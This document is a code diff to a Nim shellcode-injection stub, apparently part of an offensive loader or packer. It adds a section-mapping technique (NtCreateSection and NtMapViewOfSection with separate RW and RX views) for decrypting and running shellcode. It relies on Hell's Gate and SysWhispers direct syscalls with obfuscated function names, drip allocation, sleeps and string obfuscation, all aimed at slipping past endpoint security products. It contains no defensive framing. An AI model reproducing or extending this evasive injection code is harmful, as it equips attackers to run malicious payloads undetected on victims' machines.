@@ -81,6 +81,79 @@ let LocalInjectStub*  = """
         when defined(RWX):
             protectionValue = PAGE_EXECUTE_READWRITE
         
+        when defined(remoteMapSection):
+            when not defined(AllocateDripStyle):
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateSectionTable):
+                        syscall = ntCreateSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateSection")
+                
+                # NtCreateSection Call
+                var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+                var sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
+                var hMapFile: HANDLE
+                var protectionValueCreate: DWORD = PAGE_EXECUTE_READWRITE
+                when defined(Syswhispers):
+                    status = iuhqdihasduiahsdaksdhak(cast[PHANDLE](&buffer),SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,ULONG(protectionValue),SEC_COMMIT,0)
+                else:
+                    status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValueCreate,SEC_COMMIT,0)
+                when defined(verbose):
+                    echo obf("[*] NtCreateSection: "), toHex(status)
+                    #buffer = cast[LPVOID](&hMapFile)
+                    #echo obf("[*] Address: "), repr(buffer)
+                    #echo "This is the prompt"
+                    #var input = readLine(stdin)
+                if (hMapFile == 0):
+                    echo obf("[-] Failed to create file mapping")
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntMapViewOfSectionTable):
+                        syscall = ntMapViewOfSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+            
+                var
+                    lpMapAddress: PVOID = NULL
+                    vSize: SIZE_T = sc_size
+                
+                when defined(Syswhispers):
+                    uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+                else:
+                    status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+
+                if not NT_SUCCESS(status):
+                    when defined(verbose):
+                        echo obf("[-] NtMapViewOfSection failed")
+                        echo obf("[*] NTSTATUS: "), toHex(status)
+                else:
+                    buffer = lpMapAddress
+                    when defined(verbose):
+                        echo obf("[+] NtMapViewOfSection success!")
+                        echo obf("[*] Address: "), repr(buffer)
+                        #echo "This is the prompt"
+                        #var input = readLine(stdin)
+
+        else:
+            when not defined(AllocateDripStyle):
+                when defined(SysWhispers):
+                    status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+                else:
+                    status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+
+                if not NT_SUCCESS(status):
+                    when defined(verbose):
+                        echo obf("[-] Failed to allocate memory.")
+                        quit(1)
+                else:
+                    when defined(verbose):
+                        when defined(RX):
+                            echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
+                        else:
+                            echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
+
         when defined(AllocateDripStyle):
             buffer = DripAllocate(HANDLE(-1), cast[SIZE_T](friendlycode.len), friendlycode)
             if buffer == nil:
@@ -90,23 +163,7 @@ let LocalInjectStub*  = """
             else:
                 when defined(verbose):
                     echo obf("[+] DripAllocation Success!")
-        else:
 
-            when defined(SysWhispers):
-                status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-            else:
-                status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-
-            if not NT_SUCCESS(status):
-                when defined(verbose):
-                    echo obf("[-] Failed to allocate memory.")
-                    quit(1)
-            else:
-                when defined(verbose):
-                    when defined(RX):
-                        echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
-                    else:
-                        echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
                 
         when not defined(AllocateDripStyle):
             var bytesWritten: SIZE_T
@@ -130,6 +187,7 @@ let LocalInjectStub*  = """
             if not NT_SUCCESS(status):
                 when defined(verbose):
                     echo obf("[-] Failed to write memory.")
+                    echo obf("[-] NTSTATUS: "), toHex(status)
                     quit(1)
             else:
                 when defined(verbose):
@@ -143,32 +201,85 @@ let LocalInjectStub*  = """
 
         when not defined(AllocateDripStyle):
             when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
-                when defined(sleepinbetween):
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                ptrEncText = cast[ptr byte](buffer)
-                ptrDecText = cast[ptr byte](buffer)
-                decryptLate()
-            
-                when defined(Hellsgate):
-                    if getSyscall(ntProtectTable):
-                        syscall = ntProtectTable.wSysCall
+                when defined(remoteMapSection):
+
+                    when defined(Hellsgate):
+                        if getSyscall(ntMapViewOfSectionTable):
+                            syscall = ntMapViewOfSectionTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+                    var
+                        lpMapAddress2: PVOID = NULL
+                        vSize2: SIZE_T = sc_size
+                    when defined(Syswhispers):
+                        uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)
+                    else:
+                        status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress2,0,0,NULL,&vSize2,2,0,PAGE_EXECUTE_READ)
+
+                    if not NT_SUCCESS(status):
+                        when defined(verbose):
+                            echo obf("[-] NtMapViewOfSection failed")
+                            echo obf("[*] NTSTATUS: "), toHex(status)
                     else:
                         when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-
-                when defined(syswhispers):
-                    status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
-                else:
-                    status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
-                when defined(verbose):
-                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
-                    if (status == 0):
-                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
-                if (status != 0):
-                    when defined(verbose):
-                        echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
-                    quit(1)
+                            echo obf("[+] NtMapViewOfSection success!")
+                            echo obf("[*] Address: "), repr(lpMapAddress2)
+                            #echo "This is the prompt"
+                            #var input = readLine(stdin)
         
+                    when defined(sleepinbetween):
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                    
+                    # decrypt the first mapped RW section page
+                    ptrEncText = cast[ptr byte](buffer)
+                    ptrDecText = cast[ptr byte](buffer)
+                    decryptLate()
+                    
+                    # Set the buffer address to our newly mapped RX page.
+                    buffer = lpMapAddress2
+                else:
+                    when defined(sleepinbetween):
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                    
+                    ptrEncText = cast[ptr byte](buffer)
+                    ptrDecText = cast[ptr byte](buffer)
+                    decryptLate()
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                    when defined(syswhispers):
+                        status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
+                    else:
+                        status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
+                    when defined(verbose):
+                        echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                        if (status == 0):
+                            echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                    if (status != 0):
+                        when defined(verbose):
+                            echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
+                        quit(1)
+        
+        
+        when defined(remoteMapSection):
+            when defined(AllocateDripStyle):
+                # we can now sleep && decrypt
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                when defined(verbose):
+                    echo obf("[*] Decrypting the shellcode at address: "), toHex(cast[HANDLE](decryptbuffer)), "\r\n"
+                echo "This is the prompt"
+                var input = readLine(stdin)
+                ptrEncText = cast[ptr byte](decryptbuffer)
+                ptrDecText = cast[ptr byte](decryptbuffer)
+                decryptLate()
+                echo "This is the prompt"
+                input = readLine(stdin)
 
         when defined(QueueAPC):
             var tHandle: HANDLE = -2
